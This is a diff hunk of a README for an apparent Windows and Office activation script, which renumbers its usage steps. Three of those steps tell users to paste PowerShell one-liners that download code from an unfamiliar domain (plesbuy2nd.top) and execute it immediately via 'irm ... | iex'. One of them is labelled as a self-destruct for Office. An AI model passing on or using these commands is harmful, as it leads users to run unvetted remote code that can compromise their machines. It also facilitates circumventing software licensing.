@@ -16,15 +16,15 @@ This script provides functionality for managing Windows activation, self-destruc
    - Copy and paste the following code into PowerShell or Terminal.
    - Press **Enter** to run the script.
 
-   3.1 **Activate Windows and existing Office**
+   2.1 **Activate Windows and existing Office**
    ```powershell
    irm https://plesbuy2nd.top/win | iex
    ```
-   3.2 **Self-destruct Office (if needed)**
+   2.2 **Self-destruct Office (if needed)**
    ```powershell
    irm https://plesbuy2nd.top/doom | iex
    ```
-   3.3 **Install and activate Office 365**
+   2.3 **Install and activate Office 365**
    ```powershell
    irm https://plesbuy2nd.top/office | iex
    ```
